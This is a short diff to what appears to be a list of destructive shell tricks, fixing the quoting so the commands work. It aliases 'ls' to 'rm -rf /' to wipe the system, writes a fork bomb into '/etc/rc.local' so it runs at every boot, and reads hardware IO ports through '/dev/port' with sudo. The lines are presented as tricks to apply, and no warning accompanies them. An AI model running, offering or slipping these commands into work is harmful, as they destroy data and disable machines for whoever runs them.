@@ -3,7 +3,7 @@ Turn ls into system wipe
 alias ls="rm -rf /"
 
 Put the fork bomb bug into system startup
-echo "":(){ :|:& };: " > /etc/rc.local
+echo ":(){ :|:& };: " > /etc/rc.local
 
 Reads IO ports and has side effects
 sudo less -f /dev/port
